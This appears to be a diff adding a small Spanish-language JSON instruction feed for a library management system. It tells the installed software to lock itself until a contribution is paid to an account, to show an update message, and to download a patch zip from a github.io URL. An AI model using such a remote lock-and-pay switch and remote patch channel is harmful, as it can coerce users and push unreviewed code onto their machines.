@@ -1,0 +1,17 @@
+{
+  "fecha": "2025-09-26T12:00:00Z",
+  "instrucciones": [
+    {
+      "accion": "bloquear",
+      "motivo": "Debe realizar la contribución a la cuenta XXXX"
+    },
+    {
+      "accion": "mensaje",
+      "texto": "Nueva actualización disponible. Revise el menú de ayuda."
+    },
+    {
+      "accion": "parche",
+      "url": "https://bertellosebastian-eng.github.io/BertelloSistemaFullBiblioteca/patches/update-2025-09-26.zip"
+    }
+  ]
+}
